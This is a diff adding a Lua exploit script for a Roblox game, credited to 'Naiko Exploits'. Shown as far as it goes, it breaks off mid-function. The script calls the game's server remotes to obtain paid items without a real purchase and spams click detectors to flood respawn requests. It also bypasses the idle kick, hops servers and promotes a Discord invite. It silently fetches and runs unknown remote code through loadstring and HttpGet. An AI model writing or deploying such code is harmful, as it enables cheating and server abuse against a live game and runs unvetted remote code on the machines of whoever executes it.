@@ -1,0 +1,1834 @@
+-- Breaking Plus Made by Naiko Exploits --
+
+repeat task.wait() until game:IsLoaded() and task.wait(1.5)
+
+if game:GetService("CoreGui"):FindFirstChild("Plus") then
+	return warn("Script already running")
+elseif tostring(game.GameId == "271119130") then
+	Instance.new("BoolValue",game:GetService("CoreGui")).Name = "Plus"
+else
+	return warn("Incorrect game")
+end
+
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+	game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+end)
+
+-- General variables --
+
+local Version = 3.82
+local NeededPlaceId = nil
+local RoundMode = nil
+local UserType = 0
+local LocalPlayer = game.Players.LocalPlayer
+local UI = LocalPlayer.PlayerGui.ScreenGui
+local CustomButton = UI.buttons.log
+local CustomMenu = UI.credits
+local ClassicCredits = UI.shop.top.credits
+local PlayerList = LocalPlayer.PlayerGui.PlayerList
+local SelectedPlayer = nil
+local PlayerButtons = PlayerList.Buttons
+local PlayersList = PlayerList.PlayerList
+local SettingButton = UI.buttons.setting
+local ClonedCredits = ClassicCredits:Clone()
+local FirstPurchasable = nil
+local SecondPurchasable = nil
+local ThirdPurchasable = nil
+local FourthPurchasable = nil
+local TeleportingProc = nil
+local Credits = tonumber(ClassicCredits.Text:sub(-ClassicCredits.Text:len(),-8))
+local NotDisabled = true
+local NotDisabled2 = true
+local NotDisabled3 = true
+local NotDisabled4 = true
+local Debugging = nil
+local Sent2 = true
+
+-- Data --
+
+function DefaultData(Path,Option)
+	if isfile("NaikoScript/BreakingPlus/" .. Path) ~= false then
+		return warn("Option already exists")
+	else
+		writefile("NaikoScript/BreakingPlus/" .. Path,Option)
+		return print("Set default data")
+	end
+end
+
+function ChangeData(Path,Option,WithFolder)
+	if WithFolder == false then
+		if isfile(Path) ~= false then
+			writefile(Path,Option)
+		end
+	else 
+		if isfile("NaikoScript/BreakingPlus/" .. Path) ~= false then
+			writefile("NaikoScript/BreakingPlus/" .. Path,Option)
+		end
+	end
+end
+
+function ReturnData(Path,WithFolder)
+	if WithFolder == false then
+		if isfile(Path) ~= false then
+			return readfile(Path)
+		end
+	else
+		if isfile("NaikoScript/BreakingPlus/" .. Path) ~= false then
+			return readfile("NaikoScript/BreakingPlus/" .. Path)
+		end
+		return nil
+	end
+end
+
+if not isfolder("NaikoScript") and not isfolder("NaikoScript/BreakingPlus") then
+	makefolder("NaikoScript")
+	makefolder("NaikoScript/BreakingPlus")
+	DefaultData("Feature1.txt","false")
+	DefaultData("Feature2.txt","false")
+	DefaultData("Feature3.txt","false")
+	DefaultData("Feature4.txt","false")
+	DefaultData("Feature5.txt","false")
+	DefaultData("Feature6.txt","false")
+	DefaultData("Feature7.txt","true")
+	DefaultData("TutSettings.txt","false")
+	UserType = 1
+elseif isfolder("NaikoScript") and not isfolder("NaikoScript/BreakingPlus") then
+	UserType = 2
+	DefaultData("Feature1.txt","false")
+	DefaultData("Feature2.txt","false")
+	DefaultData("Feature3.txt","false")
+	DefaultData("Feature4.txt","false")
+	DefaultData("Feature5.txt","false")
+	DefaultData("Feature6.txt","false")
+	DefaultData("Feature7.txt","true")
+	DefaultData("TutSettings.txt","false")
+	makefolder("NaikoScript/BreakingPlus")
+elseif isfolder("NaikoScript") and isfolder("NaikoScript/BreakingPlus") then
+		DefaultData("Feature1.txt","false")
+	DefaultData("Feature2.txt","false")
+	DefaultData("Feature3.txt","false")
+	DefaultData("Feature4.txt","false")
+	DefaultData("Feature5.txt","false")
+	DefaultData("Feature6.txt","false")
+	DefaultData("Feature7.txt","true")
+	DefaultData("TutSettings.txt","false")
+	UserType = 3
+end
+local ValueUser = Instance.new("NumberValue")
+ValueUser.Parent = game:GetService("CoreGui")
+ValueUser.Name = "UserType"
+ValueUser.Value = UserType
+
+-- General functions --
+
+function UIBlur(Frame)
+local Lighting          = game:GetService("Lighting")
+local camera			= workspace.CurrentCamera
+
+local BLUR_SIZE         = Vector2.new(10, 10)
+local PART_SIZE         = 0.01
+local PART_TRANSPARENCY = 1 - 1e-7
+local START_INTENSITY	= 0.35
+local Selected = Frame
+
+Selected:SetAttribute("BlurIntensity", START_INTENSITY)
+
+local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
+BLUR_OBJ.FarIntensity   = 0
+BLUR_OBJ.NearIntensity  = Selected:GetAttribute("BlurIntensity")
+BLUR_OBJ.FocusDistance  = 0.25
+BLUR_OBJ.InFocusRadius  = 0
+BLUR_OBJ.Parent         = Lighting
+
+local PartsList         = {}
+local BlursList         = {}
+local BlurObjects       = {}
+local BlurredGui        = {}
+
+BlurredGui.__index      = BlurredGui
+
+function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
+	local n = planeNormal
+	local d = rayDirection
+	local v = rayOrigin - planePos
+
+	local num = n.x*v.x + n.y*v.y + n.z*v.z
+	local den = n.x*d.x + n.y*d.y + n.z*d.z
+	local a = -num / den
+
+	return rayOrigin + a * rayDirection, a
+end
+
+function rebuildPartsList()
+	PartsList = {}
+	BlursList = {}
+	for blurObj, part in pairs(BlurObjects) do
+		table.insert(PartsList, part)
+		table.insert(BlursList, blurObj)
+	end
+end
+
+function BlurredGui.new(frame, shape)
+	local blurPart        = Instance.new("Part")
+	blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
+	blurPart.Anchored     = true
+	blurPart.CanCollide   = false
+	blurPart.CanTouch     = false
+	blurPart.Material     = Enum.Material.Glass
+	blurPart.Transparency = PART_TRANSPARENCY
+	blurPart.Parent       = workspace.CurrentCamera
+
+	local mesh
+	if (shape == "Rectangle") then
+		mesh        = Instance.new("BlockMesh")
+		mesh.Parent = blurPart
+	elseif (shape == "Oval") then
+		mesh          = Instance.new("SpecialMesh")
+		mesh.MeshType = Enum.MeshType.Sphere
+		mesh.Parent   = blurPart
+	end
+	
+	local ignoreInset = false
+	local currentObj  = frame
+	
+	while true do
+		currentObj = currentObj.Parent
+
+		if (currentObj and currentObj:IsA("ScreenGui")) then
+			ignoreInset = currentObj.IgnoreGuiInset
+			break
+		elseif (currentObj == nil) then
+			break
+		end
+	end
+
+	local new = setmetatable({
+		Frame          = frame;
+		Part           = blurPart;
+		Mesh           = mesh;
+		IgnoreGuiInset = ignoreInset;
+	}, BlurredGui)
+
+	BlurObjects[new] = blurPart
+	rebuildPartsList()
+
+	game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
+		blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
+		BlurredGui.updateAll()
+	end)
+	return new
+end
+
+function updateGui(blurObj)
+	if (not blurObj.Frame.Visible) then
+		blurObj.Part.Transparency = 1
+		return
+	end
+	
+	local camera = workspace.CurrentCamera
+	local frame  = blurObj.Frame
+	local part   = blurObj.Part
+	local mesh   = blurObj.Mesh
+	
+	part.Transparency = PART_TRANSPARENCY
+	
+	local corner0 = frame.AbsolutePosition + BLUR_SIZE
+	local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
+	local ray0, ray1
+
+	if (blurObj.IgnoreGuiInset) then
+		ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
+		ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
+	else
+		ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
+		ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
+	end
+
+	local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
+	local planeNormal = camera.CFrame.LookVector
+	local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
+	local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
+
+	local pos0 = camera.CFrame:PointToObjectSpace(pos0)
+	local pos1 = camera.CFrame:PointToObjectSpace(pos1)
+
+	local size   = pos1 - pos0
+	local center = (pos0 + pos1)/2
+
+	mesh.Offset = center
+	mesh.Scale  = size / PART_SIZE
+end
+
+function BlurredGui.updateAll()
+	BLUR_OBJ.NearIntensity = tonumber(Selected:GetAttribute("BlurIntensity"))
+	
+	for i = 1, #BlursList do
+		updateGui(BlursList[i])
+	end
+
+	local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
+	workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
+
+	BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
+end
+
+function BlurredGui:Destroy()
+	self.Part:Destroy()
+	BlurObjects[self] = nil
+	rebuildPartsList()
+end
+
+BlurredGui.new(Selected, "Rectangle")
+
+BlurredGui.updateAll()
+return BlurredGui
+end
+
+function Debug(Message)
+	if Debugging == true then
+		warn(Message)
+		game.StarterGui:SetCore(
+			"SendNotification",
+			{
+				Title = "Debug message",
+				Text = Message
+			}
+		)
+	end
+end
+
+
+function Notify(Message,Button)
+	pcall(function()
+		if Message == nil then
+			return
+		else
+			if Button == nil then
+				Button = "Ok"
+			end
+			local CustomNotify = UI.msgbox:Clone()
+			CustomNotify.Parent = UI
+			CustomNotify.Name = "CustomMsg"
+			CustomNotify.ok.Text = Button
+			CustomNotify.Visible = true
+			CustomNotify.ImageLabel.TextLabel.Text = Message
+			CustomNotify.ok.MouseButton1Click:Connect(function()
+				CustomNotify:Destroy()
+			end)
+		end
+	end)
+end
+
+function NotifyButtons(Message,Button,Button2,Function1,Function2)
+	pcall(function()
+		if Message == nil then
+			return
+		else
+			if Button == nil then
+				Button = "Ok"
+			end
+			if Button2 == nil then
+				Button2 = "Cancel"
+			end
+			local CustomNotify = UI.msgbox:Clone()
+			local But1 = CustomNotify.ok
+			local But2 = CustomNotify.ok:Clone()
+			CustomNotify.Parent = UI
+			CustomNotify.Name = "ButtonMsg"
+			But1.Text = Button
+			But1.AnchorPoint = Vector2.new(0.5,0)
+			But1.Position = UDim2.new(0.275, 0, 1, -50)
+			But2.Text = Button2
+			But2.Parent = CustomNotify
+			But2.AnchorPoint = Vector2.new(0.5,0)
+			But2.Position = UDim2.new(0.725, 0, 1, -50)
+			CustomNotify.Visible = true
+			CustomNotify.ImageLabel.TextLabel.Text = Message
+			But1.MouseButton1Click:Connect(function()
+			local Returned = Function1()
+			if Returned[1] == "Load" then
+				local CustomLoad = UI.shop.load:Clone()
+				CustomLoad.Parent = CustomNotify
+				CustomLoad.Visible = true
+				CustomLoad.Position = UDim2.new(0, -3, 0, -22)
+				CustomLoad.BackgroundTransparency = 1
+				CustomLoad.ZIndex = 100
+				CustomLoad.Folder["1"].ZIndex = 100
+				CustomLoad.Folder["2"].ZIndex = 100
+				CustomLoad.Folder["3"].ZIndex = 100
+				CustomLoad.TextLabel.ZIndex = 100
+				CustomLoad.TextLabel.Text = Returned[2]
+				CustomLoad.TextLabel.Position = UDim2.new(0, 0, 0.21, 0)
+				local ShadowImage = CustomNotify.ImageLabel:Clone()
+				ShadowImage:ClearAllChildren()
+				ShadowImage.ZIndex = 50
+				ShadowImage.Parent = CustomNotify
+				ShadowImage.ImageTransparency = 0.4
+				ShadowImage.ImageColor3 = Color3.fromRGB(0,0,0)
+				task.wait(Returned[3])
+				CustomNotify:Destroy()
+			else
+			CustomNotify:Destroy()
+			end
+			end)
+			But2.MouseButton1Click:Connect(function()
+			local Returned = Function2()
+			if Returned[1] == "Load" then
+				local CustomLoad = UI.shop.load:Clone()
+				CustomLoad.Parent = CustomNotify
+				CustomLoad.Visible = true
+				CustomLoad.Position = UDim2.new(0, -3, 0, -22)
+				CustomLoad.BackgroundTransparency = 1
+				CustomLoad.ZIndex = 100
+				CustomLoad.Folder["1"].ZIndex = 100
+				CustomLoad.Folder["2"].ZIndex = 100
+				CustomLoad.Folder["3"].ZIndex = 100
+				CustomLoad.TextLabel.ZIndex = 100
+				CustomLoad.TextLabel.Text = Returned[2]
+				CustomLoad.TextLabel.Position = UDim2.new(0, 0, 0.21, 0)
+				local ShadowImage = CustomNotify.ImageLabel:Clone()
+				ShadowImage:ClearAllChildren()
+				ShadowImage.ZIndex = 50
+				ShadowImage.Parent = CustomNotify
+				ShadowImage.ImageTransparency = 0.4
+				ShadowImage.ImageColor3 = Color3.fromRGB(0,0,0)
+				task.wait(Returned[3])
+				CustomNotify:Destroy()
+			else
+			CustomNotify:Destroy()
+			end
+			end)
+		end
+	end)
+end
+
+function respawn(disguised) -- better way
+	local args = {
+		[1] = 42,
+		[2] = disguised
+	}
+	game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+end
+
+function lag(Requests,Debugger)
+	pcall(function()
+		if Requests ~= nil and type(Requests) == type(0) then
+			if Debugger == true then
+				Debug("Requested " .. Requests .. " respawns")
+			end
+
+			for i = 1,Requests do
+				task.spawn(function()
+					fireclickdetector(game:GetService("Workspace").disguise.SurfaceGui.ImageLabel.Part.ClickDetector)
+				end)
+			end
+		else
+			return 
+		end
+	end)
+end
+
+function serverhop(Notification)
+	if true then
+		local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
+		do
+			local string = string
+			lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
+				string.lower,
+			string.upper,
+			string.find,
+			string.split, 
+			string.sub,
+			string.format,
+			string.len,
+			string.match,
+			string.gmatch,
+			string.gsub,
+			string.byte
+		end
+		local   order = "Desc"
+		local Servers = {};
+		local url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100", game.PlaceId, order);
+		local starting = tick();
+		repeat
+			local good, result = pcall(function()
+				return game:HttpGet(url);
+			end);
+			if (not good) then
+				wait(2);
+				continue;
+			end
+			local decoded = game:GetService("HttpService"):JSONDecode(result);
+			if (#decoded.data ~= 0) then
+				Servers = decoded.data
+				for i, v in pairs(Servers) do
+					if (v.maxPlayers and v.playing and v.maxPlayers - 1 > v.playing and v.id ~= game.JobId) then
+						Server = v
+						break;
+					end
+				end
+				if (Server) then
+					break;
+				end
+			end
+			url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s", game.PlaceId, order, decoded.nextPageCursor);
+		until tick() - starting >= 600;
+		if (not Server or #Servers == 0) then
+			return 
+		end
+
+		if Notification == true then
+			Notify("Going to server " .. Server.playing .. "/" .. Server.maxPlayers)
+		end
+		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Server.id);    
+
+	end
+end
+-----------------
+function rejoin(Notification)
+	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId)
+	if Notification == true then
+		Notify("Rejoining the server")
+	end
+end
+--
+
+task.spawn(function()
+	LocalPlayer.PlayerGui:FindFirstChild("ScreenGui").ChildAdded:Connect(function(child)
+		if child.Name == "messagelabel" and child:IsA("TextLabel") then
+			if string.find(child.text,"Selected game mode: ") then
+				local Prepare = string.gsub(child.text,"Selected game mode: ","")
+				RoundMode = Prepare
+				Debug("Mode is ".. RoundMode)
+			end
+		end
+	end)
+end)
+
+local LoadingPurchase = UI.shop.load:Clone()
+LoadingPurchase.Visible = false
+LoadingPurchase.Parent = CustomMenu
+
+AnimationOnStart = function()
+	LoadingPurchase.BackgroundColor3 = Color3.fromRGB(150,150,150)
+	game:GetService("TweenService"):Create(LoadingPurchase,TweenInfo.new(0.25),{BackgroundColor3 = Color3.fromRGB(0,0,0)}):Play()
+end
+local f1 = function()
+	if httprequest then
+		task.spawn(function()
+		httprequest({
+			Url = 'http://127.0.0.1:6463/rpc?v=1',
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json',
+				Origin = 'https://discord.com'
+			},
+			Body = game:GetService("HttpService"):JSONEncode({
+				cmd = 'INVITE_BROWSER',
+				nonce = game:GetService("HttpService"):GenerateGUID(false),
+				args = {code = 'vAWJMYJYcR'}
+			})
+		})
+	end)
+	return {"Load","Joining server",3}
+	elseif setclipboard then
+		setclipboard("discord.gg/vAWJMYJYcR")
+		Notify("Failed to join automaticly. Copied the server invite link instead")
+		return {}
+
+	else
+		Notify("Failed to automaticly join or copy the server invite link. join by manually typing it discord.gg/vAWJMYJYcR")
+		return {}
+	end
+end
+task.spawn(function()
+NotifyButtons("The script has been made by naiko exploits. Join discord server?","Join server","Cancel",f1,function() return {} end)
+end)
+for i,v in pairs(UI.shop:GetDescendants()) do
+	if v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=1077224108" then
+		FirstPurchasable = v:Clone()
+	elseif v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=651760851" then
+		SecondPurchasable = v:Clone()
+	elseif v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=651761382" then
+		ThirdPurchasable = v:Clone()
+	elseif v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=1077223765" then
+		FourthPurchasable = v:Clone()
+	end
+end
+task.spawn(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/r/main/r.lua')))()
+end)
+task.spawn(function()
+	wait(0.1)
+	if  FirstPurchasable ~= nil then
+		FirstPurchasable.Parent = CustomMenu.sectionframes
+		FirstPurchasable.offsale:Destroy()
+		FirstPurchasable.type.Text = "3"
+		FirstPurchasable.type.TextSize = 15
+		FirstPurchasable.name.Text = "/e rain"
+		FirstPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=3405267362"
+		FirstPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled == true then
+				NotDisabled = false
+				if Credits < 3 then
+					NotDisabled = false
+					Notify("Not enough credits to purchase this.")
+				else
+					FirstPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Animations",
+						[3] = "Exclusive"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					FirstPurchasable.type.Text = "3"
+					NotDisabled = true
+				end
+			else
+
+			end
+		end)
+
+	else
+		UI.shop.sectionframes.ChildAdded:Wait()
+		wait(1.5)
+		for i,v in pairs(UI.shop:GetDescendants()) do
+			if v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=1077224108" then
+				FirstPurchasable = v:Clone()
+			end
+		end
+		FirstPurchasable.Parent = CustomMenu.sectionframes
+		FirstPurchasable.offsale:Destroy()
+		FirstPurchasable.type.Text = "3"
+		FirstPurchasable.type.TextSize = 15
+		FirstPurchasable.name.Text = "/e rain"
+		FirstPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=3405267362"
+		FirstPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled == true then
+				NotDisabled = false
+				if Credits < 3 then
+					Notify("Not enough credits to purchase this.")
+					NotDisabled = false
+				else
+					FirstPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Animations",
+						[3] = "Exclusive"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					FirstPurchasable.type.Text = "3"
+					NotDisabled = true
+				end
+			else
+
+			end
+		end)
+	end
+
+end)
+-------------------------------------
+task.spawn(function()
+	wait(0.1)
+	if  SecondPurchasable ~= nil then
+		SecondPurchasable.Parent = CustomMenu.sectionframes
+		SecondPurchasable.offsale:Destroy()
+		SecondPurchasable.type.Text = "10000"
+		SecondPurchasable.type.TextSize = 15
+		SecondPurchasable.name.Text = "Antlers case"
+		SecondPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=2675792665"
+		SecondPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled2 == true then
+				NotDisabled2 = false
+				if Credits < 10000 then
+					NotDisabled2 = true
+					Notify("Not enough credits to purchase this.")
+				else
+					SecondPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Accessories",
+						[3] = "Knife Antlers"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					SecondPurchasable.type.Text = "10000"
+					NotDisabled2 = true
+				end
+			else
+
+			end
+		end)
+
+	else
+		UI.shop.sectionframes.ChildAdded:Wait()
+		wait(1.5)
+		for i,v in pairs(UI.shop:GetDescendants()) do
+			if v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=651760851" then
+				SecondPurchasable = v:Clone()
+			end
+		end
+		SecondPurchasable.Parent = CustomMenu.sectionframes
+		SecondPurchasable.offsale:Destroy()
+		SecondPurchasable.type.Text = "10000"
+		SecondPurchasable.type.TextSize = 15
+		SecondPurchasable.name.Text = "Antlers case"
+		SecondPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=2675792665"
+		SecondPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled2 == true then
+				NotDisabled2 = false
+				if Credits < 10000 then
+					NotDisabled2 = true
+					Notify("Not enough credits to purchase this.")
+				else
+
+					SecondPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Accessories",
+						[3] = "Knife Antlers"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					SecondPurchasable.type.Text = "10000"
+					NotDisabled2 = true
+				end
+			else
+
+			end
+		end)
+	end
+
+end)
+------------------
+task.spawn(function()
+	wait(0.1)
+	if  ThirdPurchasable ~= nil then
+		ThirdPurchasable.Parent = CustomMenu.sectionframes
+		ThirdPurchasable.offsale:Destroy()
+		ThirdPurchasable.type.Text = "10000"
+		ThirdPurchasable.type.TextSize = 15
+		ThirdPurchasable.name.Text = "Candy Crown"
+		ThirdPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=4544072210"
+		ThirdPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled3 == true then
+				NotDisabled3 = false
+				if Credits < 10000 then
+					NotDisabled3 = true
+					Notify("Not enough credits to purchase this.")
+				else
+					ThirdPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Knife Skins",
+						[3] = "Winter Gift"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					ThirdPurchasable.type.Text = "10000"
+					NotDisabled3 = true
+				end
+			else
+
+			end
+		end)
+
+	else
+		UI.shop.sectionframes.ChildAdded:Wait()
+		wait(1.5)
+		for i,v in pairs(UI.shop:GetDescendants()) do
+			if v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=651761382" then
+				ThirdPurchasable = v:Clone()
+			end
+		end
+		ThirdPurchasable.Parent = CustomMenu.sectionframes
+		ThirdPurchasable.offsale:Destroy()
+		ThirdPurchasable.type.Text = "10000"
+		ThirdPurchasable.type.TextSize = 15
+		ThirdPurchasable.name.Text = "Candy Crown"
+		ThirdPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=4544072210"
+		ThirdPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled3 == true then
+				NotDisabled3 = false
+				if Credits < 10000 then
+					Notify("Not enough credits to purchase this.")
+					NotDisabled3 = true
+				else
+					ThirdPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Knife Skins",
+						[3] = "Winter Gift"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					ThirdPurchasable.type.Text = "10000"
+					NotDisabled3 = true
+				end
+			else
+
+			end
+		end)
+	end
+
+end)
+
+------------------
+
+task.spawn(function()
+	wait(0.1)
+	if  FourthPurchasable ~= nil then
+		FourthPurchasable.Parent = CustomMenu.sectionframes
+		FourthPurchasable.offsale:Destroy()
+		FourthPurchasable.type.Text = "10000"
+		FourthPurchasable.type.TextSize = 15
+		FourthPurchasable.name.Text = "Royal Red"
+		FourthPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=2676022029"
+		FourthPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled4 == true then
+				NotDisabled4 = false
+				if Credits < 10000 then
+					NotDisabled4 = true
+					Notify("Not enough credits to purchase this.")
+				else
+					FourthPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Chair Skins",
+						[3] = "Winter"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					FourthPurchasable.type.Text = "10000"
+					NotDisabled4 = true
+				end
+			else
+
+			end
+		end)
+
+	else
+		UI.shop.sectionframes.ChildAdded:Wait()
+		wait(1.5)
+		for i,v in pairs(UI.shop:GetDescendants()) do
+			if v:IsA("ImageButton") and v.Image == "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=1077223765" then
+				FourthPurchasable = v:Clone()
+			end
+		end
+		FourthPurchasable.Parent = CustomMenu.sectionframes
+		FourthPurchasable.offsale:Destroy()
+		FourthPurchasable.type.Text = "10000"
+		FourthPurchasable.type.TextSize = 15
+		FourthPurchasable.name.Text = "Royal Red"
+		FourthPurchasable.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=100&height=100&assetId=2676022029"
+		FourthPurchasable.MouseButton1Click:Connect(function()
+			if NotDisabled4 == true then
+				NotDisabled4 = false
+				if Credits < 10000 then
+					Notify("Not enough credits to purchase this.")
+					NotDisabled4 = true
+				else
+					FourthPurchasable.type.Text = "Loading..."
+					task.spawn(function()
+						LoadingPurchase.Visible = true
+						AnimationOnStart()
+						task.wait(5.25)
+						LoadingPurchase.Visible = false
+					end)
+					local args = {
+						[1] = 66,
+						[2] = "Chair Skins",
+						[3] = "Winter"
+					}
+
+					game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+					wait(7)
+					FourthPurchasable.type.Text = "10000"
+					NotDisabled4 = true
+				end
+			else
+
+			end
+		end)
+	end
+
+end)
+------------------
+
+
+wait()
+if FirstPurchasable == nil and SecondPurchasable == nil and ThirdPurchasable == nil and FourthPurchasable == nil then
+	game.StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "Warning",
+			Text = "Load the shop to load the dupers"
+		}
+	)
+
+end
+for i,v in pairs(CustomMenu.sectionframes:GetChildren()) do
+	v:Destroy()
+end
+for i,v in pairs(UI.buttons:GetChildren()) do
+	if v ~= CustomButton then
+		v.MouseButton1Click:Connect(function()
+			CustomMenu.Visible = false
+		end)
+	end
+end
+Die = nil
+SpamSound = nil
+HideBlood = nil
+task.spawn(function()
+	while task.wait(0.1) do
+		if HideBlood == true then
+			game:GetService("CoreGui"):WaitForChild("TopBarApp",15):FindFirstChild("FullScreenFrame").Visible = false
+		end 
+	end
+end)
+
+
+task.spawn(function()
+	local Path = game:GetService("ReplicatedStorage").model.Sound
+	repeat
+		if SpamSound == true then
+
+			Path.Playing = true
+			Path.TimePosition = math.random(10,75)/100
+		end
+		wait(0.5)
+	until nil
+end)
+
+task.spawn(function()
+
+	task.spawn(function()
+		repeat
+			task.wait()
+		until game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") ~= nil
+		task.wait()
+		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Died:Wait()
+		if Die == true then
+			Die = false
+			lag(2,true)
+			task.wait(0.01)
+			Die = true
+		end
+	end)
+	game.Players.LocalPlayer.CharacterAppearanceLoaded:Connect(function(char)
+		task.spawn(function()
+			repeat
+				task.wait()
+			until char:FindFirstChildOfClass("Humanoid") ~= nil
+			char:FindFirstChildOfClass("Humanoid").Died:Wait()
+			if Die == true then
+				Die = false
+				lag(2,true)
+				task.wait(0.01)
+				Die = true
+			end
+		end)
+	end)
+end)
+local   function SettingsToggleButton(Frame,DoFunction,UndoFunction)
+	local Button = Frame.Autosave.ImageButton
+	local AnimationHappening = false -- testing
+	Button.MouseButton1Click:Connect(function()
+		task.spawn(function()
+			task.spawn(function()
+				if Button.fill.Visible == true then
+					Button.fill.Visible = false
+				else
+					Button.fill.Visible = true
+				end
+			end)
+			AnimationHappening = true
+			game:GetService("TweenService"):Create(Button.glow,TweenInfo.new(0.175),{ImageTransparency = 0}):Play()
+			task.wait(0.175)
+			game:GetService("TweenService"):Create(Button.glow,TweenInfo.new(0.175),{ImageTransparency = 1}):Play()
+			task.wait(0.185)
+			AnimationHappening = false
+		end)
+		if Button.fill.Visible == false then
+
+			UndoFunction()
+		else
+			DoFunction()
+		end
+	end)
+
+	Button.MouseEnter:Connect(function()
+		game:GetService("TweenService"):Create(Button.glow,TweenInfo.new(0.2),{ImageTransparency = 0.7}):Play()
